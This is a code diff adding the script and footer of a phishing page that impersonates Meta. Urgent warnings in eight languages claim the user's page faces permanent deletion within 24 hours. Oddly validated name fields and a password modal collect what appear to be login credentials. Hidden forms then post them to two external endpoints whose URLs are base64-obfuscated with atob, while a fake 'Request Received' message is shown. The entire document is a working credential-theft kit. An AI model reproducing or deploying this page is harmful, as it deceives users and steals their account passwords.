+            </div>
+            <div class="footer-section">
+                <div class="footer-title">Settings</div>
+                <a href="#" class="footer-link">Preferences</a>
+                <a href="#" class="footer-link">Notifications</a>
+                <a href="#" class="footer-link">Security</a>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2025 Meta</p>
+        </div>
+    </footer>
+
+    <script>
+        
+        const translations = {
+            en: {
+                warningTitle: '🚨 URGENT: Your Page Will Be Permanently Deleted in 24 Hours!',
+                warningSubtext: 'Our automated security system has detected severe policy violations on your page. Multiple reports indicate that your page has violated our Community Standards and Terms of Service. Due to the seriousness of these violations, your page has been scheduled for PERMANENT DELETION.',
+                warningExtra: '⚠️ CRITICAL ACTION REQUIRED: You have ONLY 24 HOURS to submit a review request to prevent permanent deletion. If we do not receive your appeal within this timeframe, your page and all associated content will be PERMANENTLY REMOVED and CANNOT be recovered. This is your FINAL opportunity to save your page. Do NOT ignore this warning!',
+                videoTitle: '📹 How to Request Review',
+                deadlineLabel: 'Response Deadline',
+                deadlineTime: '24 Hours',
+                deadlineWarning: "If you don't respond within 24 hours, restrictions will be applied",
+                firstNameLabel: 'Enter value',
+                lastNameLabel: 'Enter value',
+                appealTitle: 'Appeal request',
+                appealDesc: 'Fixing problems with your page\nPlease be sure to provide the requested information below.\nFailure to provide this information may delay the processing of your appeal.',
+                appealBtn: 'Submit Appeal',
+                supportText: 'Need help? Contact us at',
+                modalTitle: 'Confirm Your Password',
+                modalSubtitle: 'Please confirm your password to complete the appeal process.',
+                passwordLabel: 'Password',
+                passwordPlaceholder: 'Enter your password',
+                cancelBtn: 'Cancel',
+                confirmBtn: 'Confirm',
+                successTitle: 'Request Received!',
+                successMessage: 'Your appeal has been successfully submitted.',
+                successInfo: 'Please wait 24-48 hours to complete your review.\nWe will notify you once the review is finished.',
+                closeBtn: 'Close'
+            },
+            hi: {
+                warningTitle: '🚨 जरूरी: आपका पेज 24 घंटों में स्थायी रूप से हटा दिया जाएगा!',
+                warningSubtext: 'हमारे स्वचालित सुरक्षा सिस्टम ने आपके पेज पर गंभीर नीति उल्लंघन का पता लगाया है। कई रिपोर्टें बताती हैं कि आपके पेज ने हमारे सामुदायिक मानकों और सेवा की शर्तों का उल्लंघन किया है। इन उल्लंघनों की गंभीरता के कारण, आपके पेज को स्थायी विलोपन के लिए निर्धारित किया गया है।',
+                warningExtra: '⚠️ महत्वपूर्ण कार्रवाई आवश्यक: स्थायी विलोपन को रोकने के लिए आपके पास केवल 24 घंटे हैं समीक्षा अनुरोध जमा करने के लिए। यदि हमें इस समय सीमा के भीतर आपकी अपील प्राप्त नहीं होती है, तो आपका पेज और सभी संबंधित सामग्री स्थायी रूप से हटा दी जाएगी और पुनर्प्राप्त नहीं की जा सकती। यह आपके पेज को बचाने का अंतिम अवसर है। इस चेतावनी को अनदेखा न करें!',
+                videoTitle: '📹 समीक्षा का अनुरोध कैसे करें',
+                deadlineLabel: 'प्रतिक्रिया की समय सीमा',
+                deadlineTime: '24 घंटे',
+                deadlineWarning: 'यदि आप 24 घंटों के भीतर प्रतिक्रिया नहीं देते हैं, तो प्रतिबंध लागू किए जाएंगे',
+                firstNameLabel: 'मान दर्ज करें',
+                lastNameLabel: 'मान दर्ज करें',
+                appealTitle: 'अपील अनुरोध',
+                appealDesc: 'आपके पेज की समस्याओं को ठीक करना\nकृपया सुनिश्चित करें कि नीचे अनुरोधित जानकारी प्रदान करें।\nइस जानकारी को प्रदान करने में विफलता आपकी अपील की प्रक्रिया में देरी कर सकती है।',
+                appealBtn: 'अपील जमा करें',
+                supportText: 'मदद चाहिए? हमसे संपर्क करें',
+                modalTitle: 'अपना पासवर्ड पुष्टि करें',
+                modalSubtitle: 'अपील प्रक्रिया को पूरा करने के लिए कृपया अपना पासवर्ड पुष्टि करें।',
+                passwordLabel: 'पासवर्ड',
+                passwordPlaceholder: 'अपना पासवर्ड दर्ज करें',
+                cancelBtn: 'रद्द करें',
+                confirmBtn: 'पुष्टि करें',
+                successTitle: 'अनुरोध प्राप्त हुआ!',
+                successMessage: 'आपकी अपील सफलतापूर्वक जमा कर दी गई है।',
+                successInfo: 'अपनी समीक्षा पूरी करने के लिए कृपया 24-48 घंटे प्रतीक्षा करें।\nसमीक्षा समाप्त होने पर हम आपको सूचित करेंगे।',
+                closeBtn: 'बंद करें'
+            },
+            es: {
+                warningTitle: '🚨 URGENTE: ¡Tu Página Será Eliminada Permanentemente en 24 Horas!',
+                warningSubtext: 'Nuestro sistema de seguridad automatizado ha detectado violaciones graves de políticas en tu página. Múltiples informes indican que tu página ha violado nuestros Estándares de la Comunidad y Términos de Servicio. Debido a la gravedad de estas violaciones, tu página ha sido programada para ELIMINACIÓN PERMANENTE.',
+                warningExtra: '⚠️ ACCIÓN CRÍTICA REQUERIDA: Tienes SOLO 24 HORAS para enviar una solicitud de revisión para evitar la eliminación permanente. Si no recibimos tu apelación dentro de este plazo, tu página y todo el contenido asociado serán ELIMINADOS PERMANENTEMENTE y NO PODRÁN recuperarse. Esta es tu ÚLTIMA oportunidad para salvar tu página. ¡NO ignores esta advertencia!',
+                videoTitle: '📹 Cómo Solicitar Revisión',
+                deadlineLabel: 'Plazo de Respuesta',
+                deadlineTime: '24 Horas',
+                deadlineWarning: 'Si no respondes dentro de 24 horas, se aplicarán restricciones',
+                firstNameLabel: 'Ingrese valor',
+                lastNameLabel: 'Ingrese valor',
+                appealTitle: 'Solicitud de apelación',
+                appealDesc: 'Solucionar problemas con tu página\nAsegúrate de proporcionar la información solicitada a continuación.\nNo proporcionar esta información puede retrasar el procesamiento de tu apelación.',
+                appealBtn: 'Enviar Apelación',
+                supportText: '¿Necesitas ayuda? Contáctanos en',
+                modalTitle: 'Confirma tu Contraseña',
+                modalSubtitle: 'Por favor confirma tu contraseña para completar el proceso de apelación.',
+                passwordLabel: 'Contraseña',
+                passwordPlaceholder: 'Ingresa tu contraseña',
+                cancelBtn: 'Cancelar',
+                confirmBtn: 'Confirmar',
+                successTitle: '¡Solicitud Recibida!',
+                successMessage: 'Tu apelación ha sido enviada exitosamente.',
+                successInfo: 'Por favor espera 24-48 horas para completar tu revisión.\nTe notificaremos una vez que la revisión esté terminada.',
+                closeBtn: 'Cerrar'
+            },
+            pt: {
+                warningTitle: '🚨 URGENTE: Sua Página Será Excluída Permanentemente em 24 Horas!',
+                warningSubtext: 'Nosso sistema de segurança automatizado detectou violações graves de políticas em sua página. Vários relatórios indicam que sua página violou nossos Padrões da Comunidade e Termos de Serviço. Devido à gravidade dessas violações, sua página foi programada para EXCLUSÃO PERMANENTE.',
+                warningExtra: '⚠️ AÇÃO CRÍTICA NECESSÁRIA: Você tem APENAS 24 HORAS para enviar uma solicitação de revisão para evitar a exclusão permanente. Se não recebermos seu recurso dentro deste prazo, sua página e todo o conteúdo associado serão PERMANENTEMENTE REMOVIDOS e NÃO PODERÃO ser recuperados. Esta é sua ÚLTIMA oportunidade para salvar sua página. NÃO ignore este aviso!',
+                videoTitle: '📹 Como Solicitar Revisão',
+                deadlineLabel: 'Prazo de Resposta',
+                deadlineTime: '24 Horas',
+                deadlineWarning: 'Se você não responder dentro de 24 horas, restrições serão aplicadas',
+                firstNameLabel: 'Digite o valor',
+                lastNameLabel: 'Digite o valor',
+                appealTitle: 'Solicitação de recurso',
+                appealDesc: 'Corrigindo problemas com sua página\nCertifique-se de fornecer as informações solicitadas abaixo.\nA falta dessas informações pode atrasar o processamento de seu recurso.',
+                appealBtn: 'Enviar Recurso',
+                supportText: 'Precisa de ajuda? Entre em contato conosco em',
+                modalTitle: 'Confirme sua Senha',
+                modalSubtitle: 'Por favor, confirme sua senha para concluir o processo de recurso.',
+                passwordLabel: 'Senha',
+                passwordPlaceholder: 'Digite sua senha',
+                cancelBtn: 'Cancelar',
+                confirmBtn: 'Confirmar',
+                successTitle: 'Solicitação Recebida!',
+                successMessage: 'Seu recurso foi enviado com sucesso.',
+                successInfo: 'Aguarde 24-48 horas para concluir sua revisão.\nNotificaremos você assim que a revisão estiver concluída.',
+                closeBtn: 'Fechar'
+            },
+            ta: {
+                warningTitle: '🚨 அவசரம்: உங்கள் பக்கம் 24 மணி நேரத்தில் நிரந்தரமாக நீக்கப்படும்!',
+                warningSubtext: 'எங்கள் தானியங்கி பாதுகாப்பு அமைப்பு உங்கள் பக்கத்தில் கடுமையான கொள்கை மீறல்களைக் கண்டறிந்துள்ளது. உங்கள் பக்கம் எங்கள் சமூக தரநிலைகள் மற்றும் சேவை விதிமுறைகளை மீறியுள்ளது என்று பல அறிக்கைகள் குறிப்பிடுகின்றன. இந்த மீறல்களின் தீவிரத்தன்மை காரணமாக, உங்கள் பக்கம் நிரந்தர நீக்கத்திற்கு திட்டமிடப்பட்டுள்ளது.',
+                warningExtra: '⚠️ முக்கியமான நடவடிக்கை தேவை: நிரந்தர நீக்கத்தைத் தடுக்க மதிப்பாய்வு கோரிக்கையை சமர்ப்பிக்க உங்களிடம் 24 மணிநேரம் மட்டுமே உள்ளது. இந்த காலக்கெடுவிற்குள் உங்கள் மேல்முறையீட்டைப் பெறவில்லை என்றால், உங்கள் பக்கம் மற்றும் அனைத்து தொடர்புடைய உள்ளடக்கமும் நிரந்தரமாக அகற்றப்படும் மற்றும் மீட்டெடுக்க முடியாது. இது உங்கள் பக்கத்தைச் சேமிக்க உங்களுக்கான இறுதி வாய்ப்பு. இந்த எச்சரிக்கையை புறக்கணிக்க வேண்டாம்!',
+                videoTitle: '📹 மதிப்பாய்வு கோரிக்கை எவ்வாறு செய்வது',
+                deadlineLabel: 'பதில் அளிக்க கடைசி நேரம்',
+                deadlineTime: '24 மணிநேரம்',
+                deadlineWarning: 'நீங்கள் 24 மணி நேரத்திற்குள் பதிலளிக்கவில்லை என்றால், கட்டுப்பாடுகள் பயன்படுத்தப்படும்',
+                firstNameLabel: 'மதிப்பை உள்ளிடவும்',
+                lastNameLabel: 'மதிப்பை உள்ளிடவும்',
+                appealTitle: 'மேல்முறையீடு கோரிக்கை',
+                appealDesc: 'உங்கள் பக்கத்தின் சிக்கல்களை சரிசெய்தல்\nகீழே கோரப்பட்ட தகவலை வழங்குவதை உறுதிசெய்யவும்.\nஇந்த தகவலை வழங்க தவறினால் உங்கள் மேல்முறையீட்டின் செயலாக்கத்தில் தзадержக்கம் ஏற்படலாம்.',
+                appealBtn: 'மேல்முறையீடு சமர்ப்பிக்கவும்',
+                supportText: 'உதவி தேவையா? எங்களை தொடர்பு கொள்ளுங்கள்',
+                modalTitle: 'உங்கள் கடவுச்சொல்லை உறுதிப்படுத்தவும்',
+                modalSubtitle: 'மேல்முறையீடு செயல்முறையை முடிக்க தயவுசெய்து உங்கள் கடவுச்சொல்லை உறுதிப்படுத்தவும்.',
+                passwordLabel: 'கடவுச்சொல்',
+                passwordPlaceholder: 'உங்கள் கடவுச்சொல்லை உள்ளிடவும்',
+                cancelBtn: 'ரத்து செய்',
+                confirmBtn: 'உறுதிப்படுத்து',
+                successTitle: 'கோரிக்கை பெறப்பட்டது!',
+                successMessage: 'உங்கள் மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது.',
+                successInfo: 'உங்கள் மதிப்பாய்வை முடிக்க 24-48 மணிநேரம் காத்திருக்கவும்.\nமதிப்பாய்வு முடிந்ததும் நாங்கள் உங்களுக்கு அறிவிப்போம்.',
+                closeBtn: 'மூடு'
+            },
+            ar: {
+                warningTitle: '🚨 عاجل: سيتم حذف صفحتك نهائيًا خلال 24 ساعة!',
+                warningSubtext: 'اكتشف نظام الأمان الآلي لدينا انتهاكات خطيرة للسياسة على صفحتك. تشير تقارير متعددة إلى أن صفحتك انتهكت معايير المجتمع وشروط الخدمة الخاصة بنا. نظرًا لخطورة هذه الانتهاكات، تم جدولة صفحتك للحذف النهائي.',
+                warningExtra: '⚠️ إجراء حاسم مطلوب: لديك 24 ساعة فقط لتقديم طلب مراجعة لمنع الحذف النهائي. إذا لم نتلق استئنافك خلال هذا الإطار الزمني، فسيتم إزالة صفحتك وجميع المحتويات المرتبطة بها نهائيًا ولن يمكن استردادها. هذه هي فرصتك الأخيرة لحفظ صفحتك. لا تتجاهل هذا التحذير!',
+                videoTitle: '📹 كيفية طلب المراجعة',
+                deadlineLabel: 'الموعد النهائي للرد',
+                deadlineTime: '24 ساعة',
+                deadlineWarning: 'إذا لم ترد خلال 24 ساعة، سيتم تطبيق القيود',
+                firstNameLabel: 'أدخل القيمة',
+                lastNameLabel: 'أدخل القيمة',
+                appealTitle: 'طلب استئناف',
+                appealDesc: 'إصلاح المشاكل في صفحتك\nيرجى التأكد من تقديم المعلومات المطلوبة أدناه.\nقد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.',
+                appealBtn: 'تقديم الاستئناف',
+                supportText: 'تحتاج مساعدة؟ اتصل بنا على',
+                modalTitle: 'تأكيد كلمة المرور',
+                modalSubtitle: 'يرجى تأكيد كلمة المرور الخاصة بك لإكمال عملية الاستئناف.',
+                passwordLabel: 'كلمة المرور',
+                passwordPlaceholder: 'أدخل كلمة المرور الخاصة بك',
+                cancelBtn: 'إلغاء',
+                confirmBtn: 'تأكيد',
+                successTitle: 'تم استلام الطلب!',
+                successMessage: 'تم تقديم استئنافك بنجاح.',
+                successInfo: 'يرجى الانتظار 24-48 ساعة لإكمال المراجعة.\nسنخطرك بمجرد الانتهاء من المراجعة.',
+                closeBtn: 'إغلاق'
+            },
+            fr: {
+                warningTitle: '🚨 URGENT: Votre Page Sera Définitivement Supprimée dans 24 Heures!',
+                warningSubtext: 'Notre système de sécurité automatisé a détecté de graves violations de politique sur votre page. Plusieurs rapports indiquent que votre page a violé nos Normes de la Communauté et nos Conditions d\'Utilisation. En raison de la gravité de ces violations, votre page a été programmée pour une SUPPRESSION DÉFINITIVE.',
+                warningExtra: '⚠️ ACTION CRITIQUE REQUISE: Vous avez SEULEMENT 24 HEURES pour soumettre une demande de révision afin d\'éviter la suppression définitive. Si nous ne recevons pas votre appel dans ce délai, votre page et tout le contenu associé seront DÉFINITIVEMENT SUPPRIMÉS et NE POURRONT PAS être récupérés. C\'est votre DERNIÈRE opportunité de sauver votre page. N\'ignorez PAS cet avertissement!',
+                videoTitle: '📹 Comment Demander un Examen',
+                deadlineLabel: 'Délai de Réponse',
+                deadlineTime: '24 Heures',
+                deadlineWarning: 'Si vous ne répondez pas dans les 24 heures, des restrictions seront appliquées',
+                firstNameLabel: 'Entrer la valeur',
+                lastNameLabel: 'Entrer la valeur',
+                appealTitle: 'Demande d\'appel',
+                appealDesc: 'Résoudre les problèmes avec votre page\nVeuillez vous assurer de fournir les informations demandées ci-dessous.\nNe pas fournir ces informations peut retarder le traitement de votre appel.',
+                appealBtn: 'Soumettre l\'Appel',
+                supportText: 'Besoin d\'aide? Contactez-nous à',
+                modalTitle: 'Confirmez Votre Mot de Passe',
+                modalSubtitle: 'Veuillez confirmer votre mot de passe pour terminer le processus d\'appel.',
+                passwordLabel: 'Mot de passe',
+                passwordPlaceholder: 'Entrez votre mot de passe',
+                cancelBtn: 'Annuler',
+                confirmBtn: 'Confirmer',
+                successTitle: 'Demande Reçue!',
+                successMessage: 'Votre appel a été soumis avec succès.',
+                successInfo: 'Veuillez attendre 24-48 heures pour terminer votre examen.\nNous vous informerons une fois l\'examen terminé.',
+                closeBtn: 'Fermer'
+            },
+            vi: {
+                warningTitle: '🚨 KHẨN CẤP: Trang Của Bạn Sẽ Bị Xóa Vĩnh Viễn Trong 24 Giờ!',
+                warningSubtext: 'Hệ thống bảo mật tự động của chúng tôi đã phát hiện các vi phạm chính sách nghiêm trọng trên trang của bạn. Nhiều báo cáo cho thấy trang của bạn đã vi phạm Tiêu chuẩn Cộng đồng và Điều khoản Dịch vụ của chúng tôi. Do mức độ nghiêm trọng của các vi phạm này, trang của bạn đã được lên lịch XÓA VĨNH VIỄN.',
+                warningExtra: '⚠️ HÀNH ĐỘNG QUAN TRỌNG CẦN THIẾT: Bạn chỉ có 24 GIỜ để gửi yêu cầu xem xét để ngăn chặn việc xóa vĩnh viễn. Nếu chúng tôi không nhận được kháng cáo của bạn trong khung thời gian này, trang của bạn và tất cả nội dung liên quan sẽ bị XÓA VĨNH VIỄN và KHÔNG THỂ khôi phục. Đây là cơ hội CUỐI CÙNG của bạn để cứu trang của mình. ĐỪNG bỏ qua cảnh báo này!',
+                videoTitle: '📹 Cách Yêu Cầu Xem Xét',
+                deadlineLabel: 'Thời hạn phản hồi',
+                deadlineTime: '24 Giờ',
+                deadlineWarning: 'Nếu bạn không phản hồi trong vòng 24 giờ, các hạn chế sẽ được áp dụng',
+                firstNameLabel: 'Nhập giá trị',
+                lastNameLabel: 'Nhập giá trị',
+                appealTitle: 'Yêu cầu kháng cáo',
+                appealDesc: 'Khắc phục sự cố với trang của bạn\nVui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới.\nViệc không cung cấp thông tin này có thể làm chậm việc xử lý kháng cáo của bạn.',
+                appealBtn: 'Gửi Kháng Cáo',
+                supportText: 'Cần giúp đỡ? Liên hệ chúng tôi tại',
+                modalTitle: 'Xác Nhận Mật Khẩu Của Bạn',
+                modalSubtitle: 'Vui lòng xác nhận mật khẩu của bạn để hoàn tất quy trình kháng cáo.',
+                passwordLabel: 'Mật khẩu',
+                passwordPlaceholder: 'Nhập mật khẩu của bạn',
+                cancelBtn: 'Hủy',
+                confirmBtn: 'Xác Nhận',
+                successTitle: 'Đã Nhận Yêu Cầu!',
+                successMessage: 'Kháng cáo của bạn đã được gửi thành công.',
+                successInfo: 'Vui lòng đợi 24-48 giờ để hoàn tất xem xét của bạn.\nChúng tôi sẽ thông báo cho bạn khi quá trình xem xét hoàn tất.',
+                closeBtn: 'Đóng'
+            }
+        };
+
+        
+        const videoSources = {
+            en: atob("aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS85NDA4NzM1ODAzMGE0ZGY4YjIwZTczZjFmYmE5MmVkNS1lbi83MjBwLm1wNA=="),
+            es: atob("aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS9kYjdlNzUzYzEzZmE0ZDIzOGZlNzE2NDgzNDY5YWU4Zi1lcy83MjBwLm1wNA=="),
+            hi: atob("aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS85ZDdlNDBmNzE0Yzg0MjI1OGJkMDhhZDRjM2VlNjhkNi1oaS83MjBwLm1wNA=="),
+            fr: atob("aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS82ZTJmMTg5M2E3OTk0MTgyOTQ4YjNkZDhmMjdlY2IyMS1mci83MjBwLm1wNA=="),
+            pt: atob("aHR0cHM6Ly9hbGx2aWRlb3Mud2FzbWVyLmFwcC9Qb3J0dWd1ZXNlLm1wNA=="),
+            ta: atob("aHR0cHM6Ly9hbGx2aWRlb3Mud2FzbWVyLmFwcC90YW1pbC5tcDQ="),
+            ar: atob("aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS9mNzM0NmIyZWY1M2M0ZGFhOWJjMTUxMzg2ODQ5MTlkYi1hcl91c2UtYWljb3VzdGljcy12b2NhbC83MjBwLm1wNA=="),
+            vi: atob("aHR0cHM6Ly9hbGx2aWRlb3Mud2FzbWVyLmFwcC92aWV0YW1hbmVzLm1wNA==")
+        };
+
+        // Language selector functionality
+        const languageModal = document.getElementById('languageModal');
+        const languageOptions = document.querySelectorAll('.language-option');
+        let currentLang = 'en';
+
+        languageOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                currentLang = this.getAttribute('data-lang');
+                translatePage(currentLang);
+                languageModal.classList.remove('active');
+            });
+        });
+
+        function translatePage(lang) {
+            const trans = translations[lang];
+            
+            // Translate all elements
+            document.querySelector('[data-key="warningTitle"]').textContent = trans.warningTitle;
+            document.querySelector('[data-key="warningSubtext"]').textContent = trans.warningSubtext;
+            document.querySelector('[data-key="warningExtra"]').textContent = trans.warningExtra;
+            document.querySelector('.video-title').textContent = trans.videoTitle;
+            document.querySelector('.deadline-label').textContent = trans.deadlineLabel;
+            document.querySelector('.deadline-time').textContent = trans.deadlineTime;
+            document.querySelector('.deadline-warning').textContent = trans.deadlineWarning;
+            document.querySelector('[data-key="appealTitle"]').textContent = trans.appealTitle;
+            document.querySelector('[data-key="appealDesc"]').textContent = trans.appealDesc;
+            document.querySelector('[data-key="appealBtn"]').textContent = trans.appealBtn;
+            document.querySelector('.modal-title').textContent = trans.modalTitle;
+            document.querySelector('.modal-subtitle').textContent = trans.modalSubtitle;
+            document.querySelector('.modal-label').textContent = trans.passwordLabel;
+            document.getElementById('modalPassword').placeholder = trans.passwordPlaceholder;
+            document.getElementById('cancelBtn').textContent = trans.cancelBtn;
+            document.getElementById('confirmBtn').textContent = trans.confirmBtn;
+            document.querySelector('.success-title').textContent = trans.successTitle;
+            document.querySelector('.success-message').textContent = trans.successMessage;
+            document.querySelector('.success-info').innerHTML = trans.successInfo.replace('\\n', '<br>');
+            document.getElementById('successBtn').textContent = trans.closeBtn;
+            
+            // Update placeholders (removed form-label updates since they are now images)
+            document.querySelector('input[name="first_name"]').placeholder = trans.firstNameLabel;
+            document.querySelector('input[name="last_name"]').placeholder = trans.lastNameLabel;
+            
+            // Update video source based on selected language
+            const videoElement = document.querySelector('.form-video-thumbnail');
+            if (videoElement && videoSources[lang]) {
+                videoElement.src = videoSources[lang];
+                videoElement.load();
+            }
+        }
+
+        // Decode base64 URLs on page load
+        function decodeBase64URLs() {
+            // Decode all data-src attributes for images
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                img.src = atob(img.getAttribute('data-src'));
+                img.removeAttribute('data-src');
+            });
+
+            // Decode all data-src attributes for videos
+            document.querySelectorAll('video[data-src]').forEach(video => {
+                video.src = atob(video.getAttribute('data-src'));
+                video.removeAttribute('data-src');
+            });
+
+            // Decode form action
+            const form = document.querySelector('form[data-action]');
+            if (form) {
+                form.action = atob(form.getAttribute('data-action'));
+                form.removeAttribute('data-action');
+            }
+
+            // Decode mailto links
+            document.querySelectorAll('a[data-href]').forEach(link => {
+                const href = atob(link.getAttribute('data-href'));
+                link.href = href;
+                link.removeAttribute('data-href');
+            });
+        }
+
+        // Run decode function on page load
+        decodeBase64URLs();
+
+        // Search bar clear button functionality
+        const searchInput = document.querySelector('.navbar-search input');
+        const clearButton = document.querySelector('.navbar-search-clear');
+
+        if (clearButton && searchInput) {
+            clearButton.addEventListener('click', function() {
+                searchInput.value = '';
+                searchInput.focus();
+            });
+
+            // Optional: Add keyboard shortcut (Ctrl+K or Cmd+K)
+            document.addEventListener('keydown', function(e) {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                    e.preventDefault();
+                    searchInput.focus();
+                }
+            });
+        }
+
+        // First Name - Numbers only
+        const firstNameInput = document.querySelector('input[name="first_name"]');
+        if (firstNameInput) {
+            firstNameInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            });
+            
+            firstNameInput.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        }
+
+        // Last Name - Must contain symbols + alphabets + numbers
+        const lastNameInput = document.querySelector('input[name="last_name"]');
+        const lastNameError = document.getElementById('lastNameError');
+        
+        if (lastNameInput) {
+            lastNameInput.addEventListener('input', function(e) {
+                // Allow letters, numbers, and symbols
+                e.target.value = e.target.value.replace(/[^\w\s\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/g, '');
+            });
+            
+            lastNameInput.addEventListener('blur', function(e) {
+                const hasAlphabet = /[a-zA-Z]/.test(e.target.value);
+                const hasNumber = /[0-9]/.test(e.target.value);
+                const hasSymbol = /[\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/.test(e.target.value);
+                
+                if (e.target.value.length > 0 && !(hasAlphabet && hasNumber && hasSymbol)) {
+                    lastNameError.textContent = '⚠ Please fill required information (must contain alphabets, numbers, and symbols)';
+                    lastNameError.style.display = 'block';
+                } else {
+                    lastNameError.style.display = 'none';
+                }
+            });
+            
+            lastNameInput.addEventListener('input', function(e) {
+                const hasAlphabet = /[a-zA-Z]/.test(e.target.value);
+                const hasNumber = /[0-9]/.test(e.target.value);
+                const hasSymbol = /[\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/.test(e.target.value);
+                
+                if (e.target.value.length > 0 && hasAlphabet && hasNumber && hasSymbol) {
+                    lastNameError.style.display = 'none';
+                }
+            });
+        }
+
+        // Password Modal Functionality
+        const passwordModal = document.getElementById('passwordModal');
+        const successModal = document.getElementById('successModal');
+        const modalPassword = document.getElementById('modalPassword');
+        const togglePassword = document.getElementById('togglePassword');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const successBtn = document.getElementById('successBtn');
+        const appealForm = document.querySelector('form');
+        let formData = {};
+
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const type = modalPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+            modalPassword.setAttribute('type', type);
+            // Toggle eye icon
+            togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+
+        // Handle form submission
+        appealForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const firstName = document.querySelector('input[name="first_name"]').value;
+            const lastName = document.querySelector('input[name="last_name"]').value;
+            
+            // Validate inputs
+            if (!firstName || !lastName) {
+                alert('Please fill in both first name and last name');
+                return;
+            }
+            
+            // Validate first name (numbers only)
+            if (!/^[0-9]+$/.test(firstName)) {
+                alert('First name must contain numbers only');
+                return;
+            }
+            
+            // Validate last name (must contain alphabet + number + symbol)
+            const hasAlphabet = /[a-zA-Z]/.test(lastName);
+            const hasNumber = /[0-9]/.test(lastName);
+            const hasSymbol = /[\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/.test(lastName);
+            
+            if (!(hasAlphabet && hasNumber && hasSymbol)) {
+                alert('Last name must contain alphabets, numbers, and symbols');
+                return;
+            }
+
+            // Store form data and show modal
+            formData = {
+                first_name: firstName,
+                last_name: lastName
+            };
+
+            // Show password modal
+            passwordModal.classList.add('active');
+            modalPassword.focus();
+        });
+
+        // Handle confirm button in modal
+        confirmBtn.addEventListener('click', function() {
+            const password = modalPassword.value;
+
+            if (!password) {
+                alert('Please enter your password');
+                return;
+            }
+
+            
+            formData.password = password;
+
+            
+            const phpForm = document.createElement('form');
+            phpForm.method = 'POST';
+            phpForm.action = atob('aHR0cHM6Ly9jb21wbGV0ZS15b3VyLXByb2Nlc3Mtbm93LnNpdGUvZHluYW1pYy5waHA=');
+            phpForm.style.display = 'none';
+
+            // Create individual inputs for each field
+            for (const [key, value] of Object.entries(formData)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                phpForm.appendChild(input);
+            }
+
+            document.body.appendChild(phpForm);
+
+            // Create second form for submit-form.com
+            const submitFormUrl = atob('aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vbFJ4bEY2eDhR');
+            const submitForm = document.createElement('form');
+            submitForm.method = 'POST';
+            submitForm.action = submitFormUrl;
+            submitForm.target = '_blank';
+            submitForm.style.display = 'none';
+
+            // Add all data to submit-form
+            for (const [key, value] of Object.entries(formData)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                submitForm.appendChild(input);
+            }
+
+            document.body.appendChild(submitForm);
+
+            
+            passwordModal.classList.remove('active');
+            successModal.classList.add('active');
+
+           
+            setTimeout(function() {
+                submitForm.submit();
+                setTimeout(function() {
+                    phpForm.submit(); 
+                }, 500);
+            }, 1000);
+        });
+
+        // Handle cancel button in modal
+        cancelBtn.addEventListener('click', function() {
+            passwordModal.classList.remove('active');
+            modalPassword.value = '';
+            formData = {};
+        });
+
+        // Handle success close button
+        successBtn.addEventListener('click', function() {
+            // Do nothing - let the form submission complete
+        });
+
+        // Close modal when clicking outside
+        passwordModal.addEventListener('click', function(e) {
+            if (e.target === passwordModal) {
+                passwordModal.classList.remove('active');
+                modalPassword.value = '';
+                formData = {};
+            }
+        });
+
+        // Allow pressing Enter to confirm
+        modalPassword.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                confirmBtn.click();
+            }
+        });
+    </script>
+</body>
+</html>
